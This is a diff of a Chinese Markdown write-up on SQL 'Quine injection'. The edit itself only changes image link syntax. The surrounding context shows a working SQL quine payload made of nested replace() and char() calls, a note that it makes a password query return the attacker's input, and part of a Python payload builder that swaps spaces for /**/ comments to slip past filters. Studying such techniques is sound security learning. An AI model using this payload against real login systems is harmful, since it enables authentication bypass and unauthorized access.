@@ -25,13 +25,13 @@ select replace(".",char(46),".");
 select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
 ```
 得到几乎相同了只有一点细微的差别
-![[file-20251217173850996.png]]
+![700](assets/Quine注入/file-20251217173850996.png)
 
 最终payload：
 ```sql
 replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
 ```
-![[file-20251217172806694.png]]
+![900](assets/Quine注入/file-20251217172806694.png)
 看到输入输出完全一样了
 这个就解决了一些sql查询密码等问题，让查询结果永远等于他自己
 
@@ -116,9 +116,9 @@ res = patch(base.replace(".",add(sql2)),sql).replace(" ","/**/").replace("'.'",'
 
 print(res)
 ```
-![[file-20251217195614491.png]]
+![](assets/Quine注入/file-20251217195614491.png)
 就帮我们构造好了（-1后面有个`'`我忘记了）
-![[file-20251217200038962.png]]
+![500](assets/Quine注入/file-20251217200038962.png)
 输入就出了
 
 # 参考文章
